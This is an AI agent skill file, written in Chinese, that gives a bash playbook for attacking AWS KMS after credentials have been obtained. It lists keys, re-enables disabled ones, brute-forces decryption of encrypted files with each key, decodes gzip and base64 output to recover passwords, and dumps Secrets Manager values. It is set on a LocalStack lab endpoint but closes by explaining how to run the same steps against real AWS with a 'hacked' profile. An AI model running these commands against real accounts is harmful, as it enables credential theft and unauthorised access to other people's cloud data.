---
name: 'aws-kms-decrypt-localstack'
description: 'LocalStack AWS KMS解密：list-keys→遍历所有key→decrypt brute-force→处理gzip/编码文件。'
disable-model-invocation: true
metadata: { domain: cloud, tier: T3 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## AWS KMS 解密攻击（LocalStack + 真实 AWS）

### 场景
- 拿到 AWS 凭据（Access Key + Secret Key）
- 发现加密文件（`.enc`、`.encrypted` 等）
- LocalStack 在 `http://127.0.0.1:4566`
- 不知道用哪个 KMS key 加密的

### KMS Key 枚举
```bash
aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys
# 提取所有 KeyId
aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys | grep KeyId | cut -d '"' -f4 > keys.txt
```

### 暴力遍历所有 Key 解密
```bash
for key in $(cat keys.txt); do
  aws --endpoint-url="http://127.0.0.1:4566/" kms enable-key --key-id "$key" 2>/dev/null
  aws kms decrypt \
    --ciphertext-blob "fileb://<encrypted_file>" \
    --endpoint-url="http://127.0.0.1:4566/" \
    --key-id "$key" \
    --encryption-algorithm "RSAES_OAEP_SHA_256" \
    --output text \
    --query Plaintext > "$key.out" 2>/dev/null
done

# 检查哪个 key 成功解密（输出非空）
wc -c *.out | grep -v "^0 "
```

### 解密后的文件处理
```bash
# 常见情况：输出是 base64 → 解码
cat key.out | base64 -d > decoded

# 可能是 gzip 压缩
file decoded
# decoded: gzip compressed data
mv decoded decoded.gz
gzip -d decoded.gz

# 最终得到密码/凭据
cat decoded
```

### AWS Secrets Manager（同时检查）
```bash
aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager list-secrets
aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager get-secret-value --secret-id "<ARN>"
```

### 真实环境 vs LocalStack
```bash
# LocalStack: 用 --endpoint-url
aws --endpoint-url="http://127.0.0.1:4566/" kms list-keys

# 真实 AWS: 去掉 --endpoint-url
aws kms list-keys --profile hacked
```
